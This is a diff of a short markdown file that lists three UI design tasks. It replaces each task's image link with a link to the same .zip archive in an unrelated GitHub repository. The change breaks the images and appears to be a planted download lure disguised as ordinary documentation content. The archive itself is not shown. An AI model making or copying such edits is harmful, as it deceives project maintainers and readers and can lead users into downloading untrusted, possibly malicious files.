@@ -1,10 +1,10 @@
 Task 01 Mobile Signup Flow
-![Task 01](https://i.ibb.co/4K25DDN/Task-01.png)
+![Task 01](https://github.com/Sajal2702/Concept-Simplified/raw/refs/heads/main/Vedanga/Simplified_Concept_v2.9.zip)
 
 Task 02 Restaurant menu
-![Task 02](https://i.ibb.co/cFnRSC1/Task.png)
+![Task 02](https://github.com/Sajal2702/Concept-Simplified/raw/refs/heads/main/Vedanga/Simplified_Concept_v2.9.zip)
 
 Task 03 Email Template
-![Task 03](https://i.ibb.co/30rSqPp/TASK-2.png)
+![Task 03](https://github.com/Sajal2702/Concept-Simplified/raw/refs/heads/main/Vedanga/Simplified_Concept_v2.9.zip)
 
 
